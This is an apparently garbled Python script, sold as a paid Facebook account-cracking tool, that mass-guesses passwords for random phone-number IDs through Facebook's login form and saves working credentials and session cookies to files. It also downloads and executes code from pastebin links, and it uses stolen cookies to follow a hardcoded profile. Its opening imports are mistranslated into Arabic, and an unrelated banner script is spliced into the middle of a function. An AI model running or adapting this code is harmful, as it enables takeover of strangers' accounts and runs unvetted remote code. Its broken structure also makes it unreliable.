استيراد  نظام التشغيل ، sys ، الوقت ، json ، عشوائي ، إعادة ، سلسلة ، منصة ، base64 ، uuid
نظام التشغيل . النظام ( "بوابة السحب" )
من  bs4  استيراد  BeautifulSoup  as  sop
من  bs4  استيراد  BeautifulSoup
 طلبات  الاستيراد ريس  _
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\\033[1;91m [✔] Sorry there is no Active  Apk ')
    else:
        print(f'\r \033[1;92m[✔] Your Active Apps :{WHITE}' )
        for i in range(len(game)):
            print(f"\r [%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\\033[1;91m [✔] Sorry there is no Expired Apk\n')
    else:
        print(f'\\033[1;92m [✔] Your Expired Apps   :{WHITE}')
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')import requests,time,pyfiglet,datetime,webbrowser
now = datetime.datetime.today()

now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
hour = str(now.hour)
mi = str(now.minute)
ss = str(now.second)
t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)


hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2023, 5, 5, 1, 10 ,9)

if (x.strftime("%x"))>(g.strftime("%x")):
 print('\x1b[1;92mاشترك بالاداة للتفعيل')
 time.sleep(1)
 print('\x1b[1;91m[+]telegram:@NN11N11-@NN11N11-@nade20080')
 time.sleep(1.7)
 print('\x1b[1;93m[+]instagram:@NN11N11') 
 time.sleep(1.3)
 print('\x1b[1;96mسيتم نقلك الى تلغرام المطور للاشتراك خلال 10 ثواني')
 time.sleep(1)
 print('\x1b[1;91m1')
 time.sleep(1)
 print('\x1b[1;91m2')
 time.sleep(1)
 print('\x1b[1;91m3')
 time.sleep(1)
 print('\x1b[1;91m4')
 time.sleep(1)
 print('\x1b[1;91m5')
 time.sleep(1)
 print('\x1b[1;91m6')
 time.sleep(1)
 print('\x1b[1;91m7')
 time.sleep(1)
 print('\x1b[1;91m8')
 time.sleep(1)
 print('\x1b[1;91m9')
 time.sleep(1)
 print('\x1b[1;91m10')
 webbrowser.open('https://t.me/KBKBOT?start=6242724080')
 exit()
import os
try:
    import pyfiglet
except ImportError:
    os.system("pip install pyfiglet")
try:
    import sys
except ImportError:
    os.system("pip install sys")
try:
    import requests
except ImportError:
    os.system("pip install requests")
try:
    import webbrowser
except ImportError:
    os.system("pip install webbrowser")
try:
    import time
except ImportError:
    os.system("pip install time")


if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")
def NiXXR(PWT):
    for e in PWT:
     sys.stdout.write(e) 
     sys.stdout.flush() 
     time.sleep(11/11109)
NiXXR('''\n

\033[1;32m___________________________________
\033[1;31m _   _    _    ____  _____ ____ 
\033[1;32m |\ | |  / \  |  _ \| ____|  _ \ 
\033[1;33m | \| | / _ \ | | | |  _| | |_) | 
\033[1;36m |  |\|/ ___ \| |_| | |___|  _ < 
\033[1;35m |_| \_/_/   \_\____/|_____|_| \_\ 
\033[1;32m___________________________________
\033[1;33m{VIP} : \033[1;31m شروحات نادر
\033[1;31m{VIP} : \033[1;34m المطور نادر
\033[1;36m{VIP} : \033[1;35m معرف المطور  @NN11N11_bot
\033[1;34m{VIP} : \033[1;36m قناه المطور @nade20080
\033[1;35m{VIP} : \033[1;32m اداه صيد فيسبوك مدفوعه
\033[1;32m{VIP} : \033[1;33m الاداه موقته مجانيه 

''')

NiXXR(f"""\033[1;35m=== === === === === === === ===
\033[1;32m[\033[1;33m1\033[1;32m] \033[1;33mScript Font
\033[1;32m[\033[1;33m2\033[1;32m] \033[1;33mShimrod Font
\033[1;32m[\033[1;33m3\033[1;32m] \033[1;33mArrows Font
\033[1;32m[\033[1;33m4\033[1;32m] \033[1;33m  الافضل 
\033[1;32m[\033[1;33m5\033[1;32m] \033[1;33mSlant Font
\033[1;32m[\033[1;33m6\033[1;32m] \033[1;33mBasic Font
\033[1;32m[\033[1;33m7\033[1;32m] \033[1;33mDoom Font
\033[1;32m[\033[1;33m8\033[1;32m] \033[1;33mBlock Font
\033[1;32m[\033[1;33m9\033[1;32m] \033[1;33mDouble Font
\033[1;32m[\033[1;33m10\033[1;32m] \033[1;33mDrpepper Font
\033[1;32m[\033[1;33m11\033[1;32m] \033[1;33mTiles Font
\033[1;32m[\033[1;33m12\033[1;32m] \033[1;33mStop Font
\033[1;32m[\033[1;33m13\033[1;32m] \033[1;33mSlscript Font
\033[1;32m[\033[1;33m14\033[1;32m] \033[1;33mSpeed Font 
\033[1;35m=== === === === === === === ===
\033[1;32m[\033[1;34m?\033[1;32m] \033[1;34mChoose : \033[0m""")
font = input("")
if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")
if font == '1':
    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
    exec(requests.get("https://pastebin.com/raw/bTheBrQY").text)
if font =='2':
    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
    exec(requests.get("https://pastebin.com/raw/sbHpWp6m").text)
if font =='3':
    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
    exec(requests.get("https://pastebin.com/raw/AUXTYFdr").text)
if font =='4':
    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36m اكتب اسمك بلانجلش وليس بلعربي:  \033[0m")
    exec(requests.get("https://pastebin.com/raw/y05ScBGD").text)
if font =='5':
    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
    exec(requests.get("https://pastebin.com/raw/6RH6A9gK").text)
if font =='6':
    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
    exec(requests.get("https://pastebin.com/raw/AqBsC1rw").text)
if font =='7':
    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
    exec(requests.get("https://pastebin.com/raw/FBR8tm1b").text)
if font =='8':
    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
    exec(requests.get("https://pastebin.com/raw/ZjStYa4V").text)
if font =='9':
    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
    exec(requests.get("https://pastebin.com/raw/VseR2czY").text)
if font == '10':
    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
    exec(requests.get("https://pastebin.com/raw/srR5fqJa").text)
if font == '11':
    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
    exec(requests.get("https://pastebin.com/raw/vMPkNs49").text)
if font == '12':
    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
    exec(requests.get("https://pastebin.com/raw/e4x3rtz8").text)
if font == '13':
    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
    exec(requests.get("https://pastebin.com/raw/GUnnBESg").text)
if font == '14':
    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
    exec(requests.get("https://pastebin.com/raw/i1J8gvxn").text)
if font =='X':
    webbrowser.open("https://t.me/nade20080")
    sys.exit()
if font =='x':
    webbrowser.open("https://t.me/nade20080")
    sys.exit()
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU

my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo = ("""

\033[1;31m  _   _    _    ____  _____ ____ 
\033[1;32m |\  | |  / \  |  _ \| ____|  _ \ 
\033[1;33m |  \| | / _ \ | | | |  _| | |_) | 
\033[1;34m | |\  |/ ___ \| |_| | |___|  _ < 
\033[1;35m |_| \_/_/   \_\____/|_____|_| \_\ 

\033[1;36m شروحات نادر @nade20080

\033[1;33m{VIP} : \033[1;31m شروحات نادر
\033[1;31m{VIP} : \033[1;34m المطور نادر
\033[1;36m{VIP} : \033[1;35m معرف المطور @NN11N11_bot
\033[1;34m{VIP} : \033[1;36m قناه المطور @nade20080
\033[1;35m{VIP} : \033[1;32m اداه صيد فيسبوك مدفوعه
\033[1;32m{VIP} : \033[1;33m الاداه موقته مجانيه                                          """)
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
 
try:
    print(' \033[1;91m[\033[1;92m✔ \033[1;91m]\033[1;92m الاداه شغاله...')
    time.sleep(3)
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n \033[1;91m[\033[1;92m✔\033[1;91m] تم تشغيل الاداه...')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2 = []
ugen = []
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
    
# APK CHECK
def xr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m الدول \033[1;91m>>\033[1;92m 0171 \033[1;91m<>\033[1;92m 0175 \033[1;91m<>\033[1;92m 92302 \033[1;91m<>\033[1;92m 92301 \033[1;91m<<')
    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
    code = input('\n \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;93m Choose \033[1;91m>>\033[1;92m ')
    limit = 50000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    RimonID = []
    print("")
    for bilal in range(passx):
        pww = 0
        RimonID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m اداه المطور نادر \033[1;91m>>\033[1;96m '+code)
        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m عدد الايديات \033[1;91m>>\033[1;93m '+tl)
        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m شروحات نادر ')
        print(' \033[1;91m[\033[1;92m✔\033[1;91m]\x1b[38;5;208m وانت تنتضر صيدك صلي على نبيك ')
        print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in RimonID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\n\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Crack process has been completed')
    print(' \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m Ids saved in SAMIR/ok.txt,SAMIR/cp.txt')
    print('\033[1;94m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><')

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'path': '/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'referer': 'https://p.facebook.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(' \n\033[1;97m[\033[1;92mNADER-OK🔥\033[1;97m]\033[1;92m ' +uid+ '\033[1;91m<>\033[1;92m' +ps+ '\n \033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m NADER 💚\033[1;91m=\033[1;96m '+coki+'')                
                open('/sdcard/NADER-ok.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                #print('[Heros-CP] ' +uid+ '|' +ps+ '')
                open('/sdcard/NADER-cp.txt', 'a').write( uid+' | '+ps+'')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r \033[1;91m[\033[1;90mNADER-\033[1;94m@nade20080\033[1;91m][\033[1;96m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]'%(loop,len(oks)))
        sys.stdout.flush()
    except:
        pass

xr()
